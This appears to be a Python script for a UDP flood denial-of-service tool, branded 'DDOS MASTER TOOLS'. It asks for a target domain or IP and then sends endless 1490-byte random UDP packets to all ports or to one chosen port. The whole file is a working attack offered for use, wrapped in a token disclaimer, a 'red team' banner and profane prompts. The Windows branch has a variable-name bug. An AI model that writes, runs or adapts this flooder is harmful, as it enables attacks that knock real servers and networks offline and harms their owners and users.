# Import.
from   platform import system
import os
import time
import random
import socket


# Version.
version = "0.2"


# Platform info
uname=system()

if uname == "Windows":
    cmd_clear_clear = 'cls'
else:
    cmd_clear = 'clear'

os.system(cmd_clear)


# Socket
sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)


# DDoS_Tool
while True:
    # UI.
    print("\033[91m   //////////////////////////////////////////////////////////////////////////////")
    print("\033[91m   //     _______________    __  ___   _____       __  __    ______           //") 
    print("\033[91m   //    /_  __/ ____/   |  /  |/  /  / ___/      / / / /   /_  __/          //")
    print("\033[91m   //     / / / __/ / /| | / /|_/ /   \__ \______/ /_/ /_____/ /            // ")
    print("\033[91m   //    / / / /___/ ___ |/ /  / /   ___/ /_____/ __  /_____/ /            //")
    print("\033[91m   //   /_/ /_____/_/  |_/_/  /_/   /____/     /_/ /_/     /_/            // ")
    print("\033[91m   //  Telegram  : @SHT7669            DDOS MASTER TOOLS                 //")
    print("\033[91m   //  Developer : RM Rony Ali         Tools Type: PAID  Version: 0.2   //")
    print("\033[91m   //////////////////////////////////////////////////////////////////////\n")
    print("\033[32m  1. Website Domain\n  2. IP Address\n  3. About\n  4. Exit")
    print('\033[0m')

    # Input.
    opt = str(input("\n\033[34m Fuck Your System:- "))

    # Selection.
    if opt == '1':
        domain = str(input("Domain:"))
        ip = socket.gethostbyname(domain)
        break

    elif opt == '2':
        ip = str(input("IP Address: "))
        break

    elif opt == '3':
        print("\n\033[101mEasy     For You\033[0m  \033[101m       \033[0m  \033[101m        \033[0m \033[101m       \033[0m \033[0m                \033[92m_____\033[0m")
        print("                  \033[101m   \033[0m  \033[101m   \033[0m \033[101m   \033[0m      \033[101m   \033[0m  \033[101m   \033[0m\033[0m             \033[92m.-'     '-.\033[0m")
        print("\033[101mOpen    Red Team\033[0m  \033[101m       \033[0m  \033[101m      \033[0m   \033[101m   \033[0m  \033[101m   \033[0m           \033[92m.'\033[91m____\033[0m secure\033[92m'.\033[0m")
        print("                  \033[101m   \033[0m \033[101m   \033[0m  \033[101m   \033[0m      \033[101m   \033[0m  \033[101m   \033[0m          \033[92m/  \033[91m|  _ \\\033[0m  \033[93m__\033[0m   \033[92m\\\033[0m")
        print("\033[101mSecure  Fuck You\033[0m  \033[101m   \033[0m  \033[101m   \033[0m \033[101m        \033[0m \033[101m       \033[0m          \033[92m;\033[0m R \033[91m| |_) /\033[0m\033[93m/ o\\\033[0m T \033[92m;\033[0m")
        print("                                                     \033[92m|\033[0m + \033[91m|  _ <\033[0m \033[93m\\__/\033[0m E \033[92m|\033[0m")
        print("we Hack To defend The Digital World                  \033[92m;\033[0m M \033[91m|_| \\ \\\033[0m \033[93m<|\033[0m  A \033[92m;\033[0m")
        print("penetration. You can test networks/servers/any        \033[92m\\       \033[91m\\/\033[0m \033[93m<|\033[0m  m\033[92m/\033[0m")
        print("Fuck Your System                                       \033[92m'.\033[0m member \033[93m<|\033[0m \033[92m.'\033[0m")
        print("                                                         \033[92m'-._____.-'\033[0m")
        print("Author of the program is not responsible for")
        print("it's usage, everybody MUST use it ONLY in         member-id: 'rst-07'")
        
        goon = input("\n\n\n\n\n\n\nPress Enter to continue:-")
        os.system(cmd_clear)

    elif opt == '4':
        exit()

    else:
        print('\033[91mInvaild Choice!\033[0m')
        time.sleep(2)
        os.system(cmd_clear)

# Port selection.
port_mode = False # If 'False' all ports will be use, if 'True' - certain.
port = 2

while 1:
    port_bool = str(input("Certain port? [y/n]: "))

    if (port_bool == "y") or (port_bool == "Y"):
        port_mode = True
        port = int(input("Port: "))
        break

    elif (port_bool == "n") or (port_bool == "N"):
        break

    else:
        print('\033[91mInvaild Choice!\033[0m')
        time.sleep(2)

# Starting working.
os.system(cmd_clear)
print('\033[36;2mINITIALIZING....')
time.sleep(1)
print('STARTING...')
time.sleep(4)

sent = 0

if port_mode == False:  # All ports.
    try:
        while True:
            if port == 65534:
                port = 1

            elif port == 1900:
                port = 1901

            sock.sendto(bytes, (ip, port))
            sent += 1
            port += 1
            print("\033[32;1mSent %s packets to %s through port:%s"%(sent, ip, port))
    except:
        print('\n\033[31;1mExited\033[0m')

elif port_mode == True: # Certain port.
    if port < 2:
        port = 2
        
    elif port == 65534:
        port = 2

    elif port == 1900:
        port = 1901

    try:
        while True:
            sock.sendto(bytes, (ip, port))
            sent += 1
            print("\033[32;1mSent %s packets to %s through port:%s"%(sent, ip, port))      
    except:
        print('\n\033[31;1mExited\033[0m')
